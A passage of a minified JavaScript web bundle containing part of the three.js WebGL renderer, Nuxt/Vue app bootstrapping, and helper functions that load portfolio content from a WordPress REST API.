o=ht(i,e.fog,r,t);z.geometry=null,z.program=null,z.wireframe=!1,function(t,e){t.render((function(t){O.renderBufferImmediate(t,e)}))}(t,o)}else O.renderBufferDirect(i,e.fog,n,r,t,a);t.onAfterRender(O,e,i,n,r,a),u=S.get(e,G||i)}function ct(t,e,i){var n=g.get(t),r=u.state.lights,a=u.state.shadowsArray,o=n.lightsHash,s=r.state.hash,l=w.getParameters(t,r.state,a,e,0,0,i),c=w.getProgramCode(t,l),h=n.program,d=!0;if(void 0===h)t.addEventListener("dispose",rt);else if(h.code!==c)at(t);else if(o.stateID!==s.stateID||o.directionalLength!==s.directionalLength||o.pointLength!==s.pointLength||o.spotLength!==s.spotLength||o.rectAreaLength!==s.rectAreaLength||o.hemiLength!==s.hemiLength||o.shadowsLength!==s.shadowsLength)o.stateID=s.stateID,o.directionalLength=s.directionalLength,o.pointLength=s.pointLength,o.spotLength=s.spotLength,o.rectAreaLength=s.rectAreaLength,o.hemiLength=s.hemiLength,o.shadowsLength=s.shadowsLength,d=!1;else{if(void 0!==l.shaderID)return;d=!1}if(d){if(l.shaderID){var p=Le[l.shaderID];n.shader={name:t.type,uniforms:Te(p.uniforms),vertexShader:p.vertexShader,fragmentShader:p.fragmentShader}}else n.shader={name:t.type,uniforms:t.uniforms,vertexShader:t.vertexShader,fragmentShader:t.fragmentShader};t.onBeforeCompile(n.shader,O),c=w.getProgramCode(t,l),h=w.acquireProgram(t,n.shader,l,c),n.program=h,t.program=h}var f=h.getAttributes();if(t.morphTargets){t.numSupportedMorphTargets=0;for(var m=0;m<O.maxMorphTargets;m++)f["morphTarget"+m]>=0&&t.numSupportedMorphTargets++}if(t.morphNormals)for(t.numSupportedMorphNormals=0,m=0;m<O.maxMorphNormals;m++)f["morphNormal"+m]>=0&&t.numSupportedMorphNormals++;var _=n.shader.uniforms;n.fog=e,void 0===o&&(n.lightsHash=o={}),o.stateID=s.stateID,o.directionalLength=s.directionalLength,o.pointLength=s.pointLength,o.spotLength=s.spotLength,o.rectAreaLength=s.rectAreaLength,o.hemiLength=s.hemiLength,o.shadowsLength=s.shadowsLength,t.lights&&(_.ambientLightColor.value=r.state.ambient,_.directionalLights.value=r.state.directional,_.spotLights.value=r.state.spot,_.rectAreaLights.value=r.state.rectArea,_.pointLights.value=r.state.point,_.hemisphereLights.value=r.state.hemi,_.directionalShadowMap.value=r.state.directionalShadowMap,_.directionalShadowMatrix.value=r.state.directionalShadowMatrix,_.spotShadowMap.value=r.state.spotShadowMap,_.spotShadowMatrix.value=r.state.spotShadowMatrix,_.pointShadowMap.value=r.state.pointShadowMap,_.pointShadowMatrix.value=r.state.pointShadowMatrix);var v=n.program.getUniforms(),y=kn.seqWithValue(v.seq,_);n.uniformsList=y}function ht(t,e,i,n){W=0;var r=g.get(i),a=u.state.lights,o=r.lightsHash,s=a.state.hash;!1===i.needsUpdate&&(void 0===r.program||i.fog&&r.fog!==e?i.needsUpdate=!0:!i.lights||o.stateID===s.stateID&&o.directionalLength===s.directionalLength&&o.pointLength===s.pointLength&&o.spotLength===s.spotLength&&o.rectAreaLength===s.rectAreaLength&&o.hemiLength===s.hemiLength&&o.shadowsLength===s.shadowsLength||(i.needsUpdate=!0)),i.needsUpdate&&(ct(i,e,n),i.needsUpdate=!1);var l,c,h=!1,p=!1,_=!1,v=r.program,y=v.getUniforms(),x=r.shader.uniforms;if(m.useProgram(v.program)&&(h=!0,p=!0,_=!0),i.id!==N&&(N=i.id,p=!0),h||D!==t){if(y.setValue(d,"projectionMatrix",t.projectionMatrix),f.logarithmicDepthBuffer&&y.setValue(d,"logDepthBufFC",2/(Math.log(t.far+1)/Math.LN2)),D!==t&&(D=t,p=!0,_=!0),i.isShaderMaterial||i.isMeshPhongMaterial||i.isMeshStandardMaterial||i.envMap){var b=y.map.cameraPosition;void 0!==b&&b.setValue(d,J.setFromMatrixPosition(t.matrixWorld))}(i.isMeshPhongMaterial||i.isMeshLambertMaterial||i.isMeshBasicMaterial||i.isMeshStandardMaterial||i.isShaderMaterial||i.skinning)&&y.setValue(d,"viewMatrix",t.matrixWorldInverse)}if(i.skinning){y.setOptional(d,n,"bindMatrix"),y.setOptional(d,n,"bindMatrixInverse");var w=n.skeleton;if(w){var T=w.bones;if(f.floatVertexTextures){if(void 0===w.boneTexture){var S=Math.sqrt(4*T.length);S=Zt.ceilPowerOfTwo(S),S=Math.max(S,4);var M=new Float32Array(S*S*4);M.set(w.boneMatrices);var E=new ue(M,S,S,Bt,zt);E.needsUpdate=!0,w.boneMatrices=M,w.boneTexture=E,w.boneTextureSize=S}y.setValue(d,"boneTexture",w.boneTexture),y.setValue(d,"boneTextureSize",w.boneTextureSize)}else y.setOptional(d,w,"boneMatrices")}}return p&&(y.setValue(d,"toneMappingExposure",O.toneMappingExposure),y.setValue(d,"toneMappingWhitePoint",O.toneMappingWhitePoint),i.lights&&(c=_,(l=x).ambientLightColor.needsUpdate=c,l.directionalLights.needsUpdate=c,l.pointLights.needsUpdate=c,l.spotLights.needsUpdate=c,l.rectAreaLights.needsUpdate=c,l.hemisphereLights.needsUpdate=c),e&&i.fog&&function(t,e){t.fogColor.value=e.color,e.isFog?(t.fogNear.value=e.near,t.fogFar.value=e.far):e.isFogExp2&&(t.fogDensity.value=e.density)}(x,e),i.isMeshBasicMaterial?ut(x,i):i.isMeshLambertMaterial?(ut(x,i),function(t,e){e.emissiveMap&&(t.emissiveMap.value=e.emissiveMap)}(x,i)):i.isMeshPhongMaterial?(ut(x,i),i.isMeshToonMaterial?function(t,e){dt(t,e),e.gradientMap&&(t.gradientMap.value=e.gradientMap)}(x,i):dt(x,i)):i.isMeshStandardMaterial?(ut(x,i),i.isMeshPhysicalMaterial?function(t,e){pt(t,e),t.reflectivity.value=e.reflectivity,t.clearCoat.value=e.clearCoat,t.clearCoatRoughness.value=e.clearCoatRoughness}(x,i):pt(x,i)):i.isMeshMatcapMaterial?(ut(x,i),function(t,e){e.matcap&&(t.matcap.value=e.matcap),e.bumpMap&&(t.bumpMap.value=e.bumpMap,t.bumpScale.value=e.bumpScale,1===e.side&&(t.bumpScale.value*=-1)),e.normalMap&&(t.normalMap.value=e.normalMap,t.normalScale.value.copy(e.normalScale),1===e.side&&t.normalScale.value.negate()),e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias)}(x,i)):i.isMeshDepthMaterial?(ut(x,i),function(t,e){e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias)}(x,i)):i.isMeshDistanceMaterial?(ut(x,i),function(t,e){e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias),t.referencePosition.value.copy(e.referencePosition),t.nearDistance.value=e.nearDistance,t.farDistance.value=e.farDistance}(x,i)):i.isMeshNormalMaterial?(ut(x,i),function(t,e){e.bumpMap&&(t.bumpMap.value=e.bumpMap,t.bumpScale.value=e.bumpScale,1===e.side&&(t.bumpScale.value*=-1)),e.normalMap&&(t.normalMap.value=e.normalMap,t.normalScale.value.copy(e.normalScale),1===e.side&&t.normalScale.value.negate()),e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias)}(x,i)):i.isLineBasicMaterial?(function(t,e){t.diffuse.value=e.color,t.opacity.value=e.opacity}(x,i),i.isLineDashedMaterial&&function(t,e){t.dashSize.value=e.dashSize,t.totalSize.value=e.dashSize+e.gapSize,t.scale.value=e.scale}(x,i)):i.isPointsMaterial?function(t,e){t.diffuse.value=e.color,t.opacity.value=e.opacity,t.size.value=e.size*Y,t.scale.value=.5*V,t.map.value=e.map,null!==e.map&&(!0===e.map.matrixAutoUpdate&&e.map.updateMatrix(),t.uvTransform.value.copy(e.map.matrix))}(x,i):i.isSpriteMaterial?function(t,e){t.diffuse.value=e.color,t.opacity.value=e.opacity,t.rotation.value=e.rotation,t.map.value=e.map,null!==e.map&&(!0===e.map.matrixAutoUpdate&&e.map.updateMatrix(),t.uvTransform.value.copy(e.map.matrix))}(x,i):i.isShadowMaterial&&(x.color.value=i.color,x.opacity.value=i.opacity),void 0!==x.ltc_1&&(x.ltc_1.value=we.LTC_1),void 0!==x.ltc_2&&(x.ltc_2.value=we.LTC_2),kn.upload(d,r.uniformsList,x,O)),i.isShaderMaterial&&!0===i.uniformsNeedUpdate&&(kn.upload(d,r.uniformsList,x,O),i.uniformsNeedUpdate=!1),i.isSpriteMaterial&&y.setValue(d,"center",n.center),y.setValue(d,"modelViewMatrix",n.modelViewMatrix),y.setValue(d,"normalMatrix",n.normalMatrix),y.setValue(d,"modelMatrix",n.matrixWorld),v}function ut(t,e){var i;t.opacity.value=e.opacity,e.color&&(t.diffuse.value=e.color),e.emissive&&t.emissive.value.copy(e.emissive).multiplyScalar(e.emissiveIntensity),e.map&&(t.map.value=e.map),e.alphaMap&&(t.alphaMap.value=e.alphaMap),e.specularMap&&(t.specularMap.value=e.specularMap),e.envMap&&(t.envMap.value=e.envMap,t.flipEnvMap.value=e.envMap.isCubeTexture?-1:1,t.reflectivity.value=e.reflectivity,t.refractionRatio.value=e.refractionRatio,t.maxMipLevel.value=g.get(e.envMap).__maxMipLevel),e.lightMap&&(t.lightMap.value=e.lightMap,t.lightMapIntensity.value=e.lightMapIntensity),e.aoMap&&(t.aoMap.value=e.aoMap,t.aoMapIntensity.value=e.aoMapIntensity),e.map?i=e.map:e.specularMap?i=e.specularMap:e.displacementMap?i=e.displacementMap:e.normalMap?i=e.normalMap:e.bumpMap?i=e.bumpMap:e.roughnessMap?i=e.roughnessMap:e.metalnessMap?i=e.metalnessMap:e.alphaMap?i=e.alphaMap:e.emissiveMap&&(i=e.emissiveMap),void 0!==i&&(i.isWebGLRenderTarget&&(i=i.texture),!0===i.matrixAutoUpdate&&i.updateMatrix(),t.uvTransform.value.copy(i.matrix))}function dt(t,e){t.specular.value=e.specular,t.shininess.value=Math.max(e.shininess,1e-4),e.emissiveMap&&(t.emissiveMap.value=e.emissiveMap),e.bumpMap&&(t.bumpMap.value=e.bumpMap,t.bumpScale.value=e.bumpScale,1===e.side&&(t.bumpScale.value*=-1)),e.normalMap&&(t.normalMap.value=e.normalMap,t.normalScale.value.copy(e.normalScale),1===e.side&&t.normalScale.value.negate()),e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias)}function pt(t,e){t.roughness.value=e.roughness,t.metalness.value=e.metalness,e.roughnessMap&&(t.roughnessMap.value=e.roughnessMap),e.metalnessMap&&(t.metalnessMap.value=e.metalnessMap),e.emissiveMap&&(t.emissiveMap.value=e.emissiveMap),e.bumpMap&&(t.bumpMap.value=e.bumpMap,t.bumpScale.value=e.bumpScale,1===e.side&&(t.bumpScale.value*=-1)),e.normalMap&&(t.normalMap.value=e.normalMap,t.normalScale.value.copy(e.normalScale),1===e.side&&t.normalScale.value.negate()),e.displacementMap&&(t.displacementMap.value=e.displacementMap,t.displacementScale.value=e.displacementScale,t.displacementBias.value=e.displacementBias),e.envMap&&(t.envMapIntensity.value=e.envMapIntensity)}et(),this.vr=null,this.shadowMap={enabled:!1},this.getContext=function(){return d},this.getContextAttributes=function(){return d.getContextAttributes()},this.forceContextLoss=function(){var t=p.get("WEBGL_lose_context");t&&t.loseContext()},this.forceContextRestore=function(){var t=p.get("WEBGL_lose_context");t&&t.restoreContext()},this.getPixelRatio=function(){return Y},this.setPixelRatio=function(t){void 0!==t&&(Y=t,this.setSize(H,V,!1))},this.getSize=function(t){return void 0===t&&(t=new Jt),t.set(H,V)},this.setSize=function(t,i,n){H=t,V=i,e.width=t*Y,e.height=i*Y,!1!==n&&(e.style.width=t+"px",e.style.height=i+"px"),this.setViewport(0,0,t,i)},this.getDrawingBufferSize=function(t){return void 0===t&&(t=new Jt),t.set(H*Y,V*Y)},this.setDrawingBufferSize=function(t,i,n){H=t,V=i,Y=n,e.width=t*n,e.height=i*n,this.setViewport(0,0,t,i)},this.getCurrentViewport=function(t){return void 0===t&&(t=new ke),t.copy(U)},this.getViewport=function(t){return t.copy(X)},this.setViewport=function(t,e,i,n){t.isVector4?X.set(t.x,t.y,t.z,t.w):X.set(t,e,i,n),m.viewport(U.copy(X).multiplyScalar(Y))},this.getScissor=function(t){return t.copy($)},this.setScissor=function(t,e,i,n){t.isVector4?$.set(t.x,t.y,t.z,t.w):$.set(t,e,i,n),m.scissor(B.copy($).multiplyScalar(Y))},this.getScissorTest=function(){return q},this.setScissorTest=function(t){m.setScissorTest(q=t)},this.getClearColor=function(){return M.getClearColor()},this.setClearColor=function(){M.setClearColor.apply(M,arguments)},this.getClearAlpha=function(){return M.getClearAlpha()},this.setClearAlpha=function(){M.setClearAlpha.apply(M,arguments)},this.clear=function(t,e,i){var n=0;(void 0===t||t)&&(n|=d.COLOR_BUFFER_BIT),(void 0===e||e)&&(n|=d.DEPTH_BUFFER_BIT),(void 0===i||i)&&(n|=d.STENCIL_BUFFER_BIT),d.clear(n)},this.clearColor=function(){this.clear(!0,!1,!1)},this.clearDepth=function(){this.clear(!1,!0,!1)},this.clearStencil=function(){this.clear(!1,!1,!0)},this.dispose=function(){e.removeEventListener("webglcontextlost",it,!1),e.removeEventListener("webglcontextrestored",nt,!1),T.dispose(),S.dispose(),g.dispose(),b.dispose(),animation.stop()},this.renderBufferImmediate=function(t,e){m.initAttributes();var i=g.get(t);t.hasPositions&&!i.position&&(i.position=d.createBuffer()),t.hasNormals&&!i.normal&&(i.normal=d.createBuffer()),t.hasUvs&&!i.uv&&(i.uv=d.createBuffer()),t.hasColors&&!i.color&&(i.color=d.createBuffer());var n=e.getAttributes();t.hasPositions&&(d.bindBuffer(d.ARRAY_BUFFER,i.position),d.bufferData(d.ARRAY_BUFFER,t.positionArray,d.DYNAMIC_DRAW),m.enableAttribute(n.position),d.vertexAttribPointer(n.position,3,d.FLOAT,!1,0,0)),t.hasNormals&&(d.bindBuffer(d.ARRAY_BUFFER,i.normal),d.bufferData(d.ARRAY_BUFFER,t.normalArray,d.DYNAMIC_DRAW),m.enableAttribute(n.normal),d.vertexAttribPointer(n.normal,3,d.FLOAT,!1,0,0)),t.hasUvs&&(d.bindBuffer(d.ARRAY_BUFFER,i.uv),d.bufferData(d.ARRAY_BUFFER,t.uvArray,d.DYNAMIC_DRAW),m.enableAttribute(n.uv),d.vertexAttribPointer(n.uv,2,d.FLOAT,!1,0,0)),t.hasColors&&(d.bindBuffer(d.ARRAY_BUFFER,i.color),d.bufferData(d.ARRAY_BUFFER,t.colorArray,d.DYNAMIC_DRAW),m.enableAttribute(n.color),d.vertexAttribPointer(n.color,3,d.FLOAT,!1,0,0)),m.disableUnusedAttributes(),d.drawArrays(d.TRIANGLES,0,t.count),t.count=0},this.renderBufferDirect=function(t,e,i,n,r,a){var o=r.isMesh&&r.matrixWorld.determinant()<0;m.setMaterial(n,o);var s=ht(t,e,n,r),l=!1;z.geometry===i.id&&z.program===s.id&&z.wireframe===(!0===n.wireframe)||(z.geometry=i.id,z.program=s.id,z.wireframe=!0===n.wireframe,l=!0),r.morphTargetInfluences&&(E.update(r,i,n,s),l=!0);var c,h=i.index,u=i.attributes.position,_=1;!0===n.wireframe&&(h=x.getWireframeAttribute(i),_=2);var g=L;null!==h&&(c=y.get(h),(g=k).setIndex(c)),l&&(function(t,e,i){if(!i||!i.isInstancedBufferGeometry||f.isWebGL2||null!==p.get("ANGLE_instanced_arrays")){m.initAttributes();var n=i.attributes,r=e.getAttributes(),a=t.defaultAttributeValues;for(var o in r){var s=r[o];if(s>=0){var l=n[o];if(void 0!==l){var c=l.normalized,h=l.itemSize,u=y.get(l);if(void 0===u)continue;var _=u.buffer,g=u.type,v=u.bytesPerElement;if(l.isInterleavedBufferAttribute){var x=l.data,b=x.stride,w=l.offset;x&&x.isInstancedInterleavedBuffer?(m.enableAttributeAndDivisor(s,x.meshPerAttribute),void 0===i.maxInstancedCount&&(i.maxInstancedCount=x.meshPerAttribute*x.count)):m.enableAttribute(s),d.bindBuffer(d.ARRAY_BUFFER,_),d.vertexAttribPointer(s,h,g,c,b*v,w*v)}else l.isInstancedBufferAttribute?(m.enableAttributeAndDivisor(s,l.meshPerAttribute),void 0===i.maxInstancedCount&&(i.maxInstancedCount=l.meshPerAttribute*l.count)):m.enableAttribute(s),d.bindBuffer(d.ARRAY_BUFFER,_),d.vertexAttribPointer(s,h,g,c,0,0)}else if(void 0!==a){var T=a[o];if(void 0!==T)switch(T.length){case 2:d.vertexAttrib2fv(s,T);break;case 3:d.vertexAttrib3fv(s,T);break;case 4:d.vertexAttrib4fv(s,T);break;default:d.vertexAttrib1fv(s,T)}}}}m.disableUnusedAttributes()}}(n,s,i),null!==h&&d.bindBuffer(d.ELEMENT_ARRAY_BUFFER,c.buffer));var v=1/0;null!==h?v=h.count:void 0!==u&&(v=u.count);var b=i.drawRange.start*_,w=i.drawRange.count*_,T=null!==a?a.start*_:0,S=null!==a?a.count*_:1/0,M=Math.max(b,T),A=Math.min(v,b+w,T+S)-1,P=Math.max(0,A-M+1);if(0!==P){if(r.isMesh)if(!0===n.wireframe)m.setLineWidth(n.wireframeLinewidth*Q()),g.setMode(d.LINES);else switch(r.drawMode){case 0:g.setMode(d.TRIANGLES);break;case 1:g.setMode(d.TRIANGLE_STRIP);break;case 2:g.setMode(d.TRIANGLE_FAN)}else if(r.isLine){var O=n.linewidth;void 0===O&&(O=1),m.setLineWidth(O*Q()),r.isLineSegments?g.setMode(d.LINES):r.isLineLoop?g.setMode(d.LINE_LOOP):g.setMode(d.LINE_STRIP)}else r.isPoints?g.setMode(d.POINTS):r.isSprite&&g.setMode(d.TRIANGLES);i&&i.isInstancedBufferGeometry?i.maxInstancedCount>0&&g.renderInstances(i,M,P):g.render(M,P)}},this.compile=function(t,e){(u=S.get(t,e)).init(),t.traverse((function(t){t.isLight&&(u.pushLight(t),t.castShadow&&u.pushShadow(t))})),u.setupLights(e),t.traverse((function(e){if(e.material)if(Array.isArray(e.material))for(var i=0;i<e.material.length;i++)ct(e.material[i],t.fog,e);else ct(e.material,t.fog,e)}))},this.render=function(t,e){var i,n;if(void 0!==arguments[2]&&(i=arguments[2]),void 0!==arguments[3]&&(n=arguments[3]),e&&e.isCamera&&!C){z.geometry=null,z.program=null,z.wireframe=!1,N=-1,D=null,!0===t.autoUpdate&&t.updateMatrixWorld(),null===e.parent&&e.updateMatrixWorld(),(u=S.get(t,e)).init(),t.onBeforeRender(O,t,e,i||I),K.multiplyMatrices(e.projectionMatrix,e.matrixWorldInverse),Z.setFromMatrix(K),this.localClippingEnabled,(h=T.get(t,e)).init(),ot(t,e,0,O.sortObjects),!0===O.sortObjects&&h.sort(),u.state.shadowsArray,u.setupLights(e),this.info.autoReset&&this.info.reset(),void 0!==i&&this.setRenderTarget(i),M.render(h,t,e,n);var r=h.opaque,a=h.transparent;if(t.overrideMaterial){var o=t.overrideMaterial;r.length&&st(r,t,e,o),a.length&&st(a,t,e,o)}else r.length&&st(r,t,e),a.length&&st(a,t,e);null!==I&&(v.updateRenderTargetMipmap(I),v.updateMultisampleRenderTarget(I)),m.buffers.depth.setTest(!0),m.buffers.depth.setMask(!0),m.buffers.color.setMask(!0),m.setPolygonOffset(!1),t.onAfterRender(O,t,e),h=null,u=null}},this.allocTextureUnit=function(){var t=W;return f.maxTextures,W+=1,t},this.setTexture2D=(P=!1,function(t,e){t&&t.isWebGLRenderTarget&&(P||(P=!0),t=t.texture),v.setTexture2D(t,e)}),this.setTexture3D=function(t,e){v.setTexture3D(t,e)},this.setTexture=function(){var t=!1;return function(e,i){t||(t=!0),v.setTexture2D(e,i)}}(),this.setTextureCube=function(){var t=!1;return function(e,i){e&&e.isWebGLRenderTargetCube&&(t||(t=!0),e=e.texture),e&&e.isCubeTexture||Array.isArray(e.image)&&6===e.image.length?v.setTextureCube(e,i):v.setTextureCubeDynamic(e,i)}}(),this.setFramebuffer=function(t){R=t},this.getRenderTarget=function(){return I},this.setRenderTarget=function(t,e,i){I=t,t&&void 0===g.get(t).__webglFramebuffer&&v.setupRenderTarget(t);var n=R,r=!1;if(t){var a=g.get(t).__webglFramebuffer;t.isWebGLRenderTargetCube?(n=a[e||0],r=!0):n=t.isWebGLMultisampleRenderTarget?g.get(t).__webglMultisampledFramebuffer:a,U.copy(t.viewport),B.copy(t.scissor),j=t.scissorTest}else U.copy(X).multiplyScalar(Y),B.copy($).multiplyScalar(Y),j=q;if(F!==n&&(d.bindFramebuffer(d.FRAMEBUFFER,n),F=n),m.viewport(U),m.scissor(B),m.setScissorTest(j),r){var o=g.get(t.texture);d.framebufferTexture2D(d.FRAMEBUFFER,d.COLOR_ATTACHMENT0,d.TEXTURE_CUBE_MAP_POSITIVE_X+e||0,o.__webglTexture,i||0)}},this.readRenderTargetPixels=function(t,e,i,n,r,a){if(t&&t.isWebGLRenderTarget){var o=g.get(t).__webglFramebuffer;if(o){var s=!1;o!==F&&(d.bindFramebuffer(d.FRAMEBUFFER,o),s=!0);try{var l=t.texture,c=l.format,h=l.type;if(c!==Bt&&A.convert(c)!==d.getParameter(d.IMPLEMENTATION_COLOR_READ_FORMAT))return;if(!(h===Ft||A.convert(h)===d.getParameter(d.IMPLEMENTATION_COLOR_READ_TYPE)||h===zt&&(f.isWebGL2||p.get("OES_texture_float")||p.get("WEBGL_color_buffer_float"))||h===Dt&&(f.isWebGL2?p.get("EXT_color_buffer_float"):p.get("EXT_color_buffer_half_float"))))return;d.checkFramebufferStatus(d.FRAMEBUFFER)===d.FRAMEBUFFER_COMPLETE&&e>=0&&e<=t.width-n&&i>=0&&i<=t.height-r&&d.readPixels(e,i,n,r,A.convert(c),A.convert(h),a)}finally{s&&d.bindFramebuffer(d.FRAMEBUFFER,F)}}}},this.copyFramebufferToTexture=function(t,e,i){var n=e.image.width,r=e.image.height,a=A.convert(e.format);this.setTexture2D(e,0),d.copyTexImage2D(d.TEXTURE_2D,i||0,a,t.x,t.y,n,r,0)},this.copyTextureToTexture=function(t,e,i,n){var r=e.image.width,a=e.image.height,o=A.convert(i.format),s=A.convert(i.type);this.setTexture2D(i,0),e.isDataTexture?d.texSubImage2D(d.TEXTURE_2D,n||0,t.x,t.y,r,a,o,s,e.image.data):d.texSubImage2D(d.TEXTURE_2D,n||0,t.x,t.y,o,s,e.image)}},WebGLRenderTarget:tr,VideoTexture:sr,Texture:he,Clock:er,Geometry:je,Vector2:Jt,Vector3:ee,Color:be,Matrix4:Qt,Plane:fe,Scene:ir,OrthographicCamera:rr,PerspectiveCamera:ar,Group:or,Mesh:Mi,LinearFilter:1006,DoubleSide:2,VertexColors:2,PlaneGeometry:ai,PlaneBufferGeometry:oi,MeshBasicMaterial:Si,ShaderMaterial:bi,LoadingManager:lr,TextureLoader:dr,GLTFLoader:Da,AmbientLight:Ga,AnimationMixer:ja,LoopOnce:2200,LoopRepeat:2201},i(1),i(275),i(243),i(244),i(245),i(246),i(247),i(248),i(249),i(250),i(251),i(252),i(253),i(254),i(255),i(258),i(259),i(260),i(261),i(262),i(263),i(264),i(265),i(267),i(268),i(269),i(270),i(271),i(272),i(273),i(274),"NodeList"in window&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=function(t,e){e=e||window;for(var i=0;i<this.length;i++)t.call(e,this[i],i,this)}),Array.from||(Array.from=(Ra=Object.prototype.toString,Ia=function(t){return"function"==typeof t||"[object Function]"===Ra.call(t)},Fa=Math.pow(2,53)-1,Na=function(t){var e=function(t){var e=Number(t);return isNaN(e)?0:0!==e&&isFinite(e)?(e>0?1:-1)*Math.floor(Math.abs(e)):e}(t);return Math.min(Math.max(e,0),Fa)},function(t){var e=this,i=Object(t);if(null==t)throw new TypeError("Array.from requires an array-like object - not null or undefined");var n,r=arguments.length>1?arguments[1]:void 0;if(void 0!==r){if(!Ia(r))throw new TypeError("Array.from: when provided, the second argument must be a function");arguments.length>2&&(n=arguments[2])}for(var a,o=Na(i.length),s=Ia(e)?Object(new e(o)):new Array(o),l=0;l<o;)a=i[l],s[l]=r?void 0===n?r(a,l):r.call(n,a,l):a,l+=1;return s.length=o,s})),i.d(e,"b",(function(){return Ya})),i.d(e,"a",(function(){return E})),r.a.component(s.a.name,s.a),r.a.component(c.a.name,Ha({},c.a,{render:function(t,e){return c.a._warned||(c.a._warned=!0),c.a.render(t,e)}})),r.a.component(b.name,b),r.a.component("NChild",b),r.a.component(k.name,k),r.a.use(a.a,{keyName:"head",attribute:"data-n-head",ssrAttribute:"data-n-head-ssr",tagIDKeyName:"hid"});var Va={name:"page",mode:"out-in",appear:!1,appearClass:"appear",appearActiveClass:"appear-active",appearToClass:"appear-to"};function Ya(t){var e,i,n,a,o,s,l,c;return regeneratorRuntime.async((function(d){for(;;)switch(d.prev=d.next){case 0:return d.next=2,regeneratorRuntime.awrap(new h.a(x));case 2:return e=d.sent,(i=j(t)).$router=e,n=i.registerModule,i.registerModule=function(t,e,r){return n.call(i,t,e,Object.assign({preserveState:!0},r))},a=Ha({store:i,router:e,nuxt:{defaultTransition:Va,transitions:[Va],setTransitions:function(t){return Array.isArray(t)||(t=[t]),t=t.map((function(t){return t?"string"==typeof t?Object.assign({},Va,{name:t}):Object.assign({},Va,t):Va})),this.$options.nuxt.transitions=t,t},err:null,dateErr:null,error:function(e){e=e||null,a.context._errored=Boolean(e),e=e?Object(u.l)(e):null;var i=this.nuxt||this.$options.nuxt;return i.dateErr=Date.now(),i.err=e,t&&(t.nuxt.error=e),e}}},N),i.app=a,o=t?t.next:function(t){return a.router.push(t)},t?s=e.resolve(t.url).route:(l=Object(u.d)(e.options.base),s=e.resolve(l).route),d.next=13,regeneratorRuntime.awrap(Object(u.o)(a,{store:i,route:s,next:o,error:a.nuxt.error.bind(a),payload:t?t.payload:void 0,req:t?t.req:void 0,res:t?t.res:void 0,beforeRenderFns:t?t.beforeRenderFns:void 0,ssrContext:t}));case 13:c=function(t,e){if(!t)throw new Error("inject(key, value) has no key provided");if(void 0===e)throw new Error("inject(key, value) has no value provided");a[t="$"+t]=e,i[t]=a[t];var n="__nuxt_"+t+"_installed__";r.a[n]||(r.a[n]=!0,r.a.use((function(){r.a.prototype.hasOwnProperty(t)||Object.defineProperty(r.a.prototype,t,{get:function(){return this.$root.$options[t]}})})))},window.__NUXT__&&window.__NUXT__.state&&i.replaceState(window.__NUXT__.state),d.next=18;break;case 18:return d.next=21,regeneratorRuntime.awrap(X(a.context,c));case 21:return d.next=24,regeneratorRuntime.awrap(rt(a.context));case 24:return d.next=27,regeneratorRuntime.awrap(St(a.context));case 27:d.next=30;break;case 30:d.next=33;break;case 33:d.next=36;break;case 36:d.next=39;break;case 39:return d.abrupt("return",{store:i,app:a,router:e});case 40:case"end":return d.stop()}}))}},,function(t,e,i){"use strict";e.a={rootUrl:"/",apiBase:"https://wp.maxilla.jp/",awsBase:"https://rebel-sam.s3.eu-west-2.amazonaws.com/"}},,,,,,,,,,function(t,e,i){"use strict";var n=i(17),r=(i(5),i(30)),a=i.n(r),o=i(54);e.a={apiBase:o.a.apiBase,getPickups:function(t){var e=this;return new Promise((function(t,i){a.a.defaults.baseURL=e.apiBase,a.a.get("/wp-json/wp/v2/rest_get_pickups").then((function(e){var r=Object(n.a)(e.data);200===e.status&&e.data.length>0?t(r):i(e)}))}))},getAllWorks:function(t){var e=this;return new Promise((function(t,i){a.a.defaults.baseURL=e.apiBase,a.a.get("/wp-json/wp/v2/rest_get_all_works").then((function(e){var r=Object(n.a)(e.data);200===e.status&&e.data.length>0?t(r):i(e)}))}))},getCategories:function(){var t=this;return new Promise((function(e,i){a.a.defaults.baseURL=t.apiBase,a.a.get("/wp-json/wp/v2/rest_get_categories/").then((function(t){var r=Object(n.a)(t.data);200===t.status&&t.data.length>0?e(r):i(t)}))}))},getPages:function(t){var e=this;return new Promise((function(t,i){a.a.defaults.baseURL=e.apiBase,a.a.get("/wp-json/wp/v2/rest_get_pages").then((function(e){200===e.status&&e.data?t(e.data):i(e)}))}))}}},,,,,,,,,,function(t,e,i){"use strict";var n={};n.pages=i(193),n.pages=n.pages.default||n.pages,e.a=n},,,,,,,,,,,,,,,,,,,function(t,e,i){var n=i(203);"string"==typeof n&&(n=[[t.i,n,""]]),n.locals&&(t.exports=n.locals),(0,i(157).default)("72daabed",n,!0,{sourceMap:!1})},function(t,e,i){"use strict";i(5),i(101),i(31),i(9),i(71),i(84);var n=i(2),r=window.requestIdleCallback||function(t){var e=Date.now();return setTimeout((function(){t({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-e))}})}),1)},a=window.cancelIdleCallback||function(t){clearTimeout(t)},o=window.IntersectionObserver&&new window.IntersectionObserver((function(t){t.forEach((function(t){var e=t.intersectionRatio,i=t.target;e<=0||i.__prefetch()}))}));e.a={name:"NuxtLink",extends:n.a.component("RouterLink"),props:{prefetch:{type:Boolean,default:!0},noPrefetch:{type:Boolean,default:!1}},mounted:function(){this.prefetch&&!this.noPrefetch&&(this.handleId=r(this.observe,{timeout:2e3}))},beforeDestroy:function(){a(this.handleId),this.__observed&&(o.unobserve(this.$el),delete this.$el.__prefetch)},methods:{observe:function(){o&&this.shouldPrefetch()&&(this.$el.__prefetch=this.prefetchLink.bind(this),o.observe(this.$el),this.__observed=!0)},shouldPrefetch:function(){return this.getPrefetchComponents().length>0},canPrefetch:function(){var t=navigator.connection;return!(this.$nuxt.isOffline||t&&((t.effectiveType||"").includes("2g")||t.saveData))},getPrefetchComponents:function(){return this.$router.resolve(this.to,this.$route,this.append).resolved.matched.map((function(t){return t.components.default})).filter((function(t){return"function"==typeof 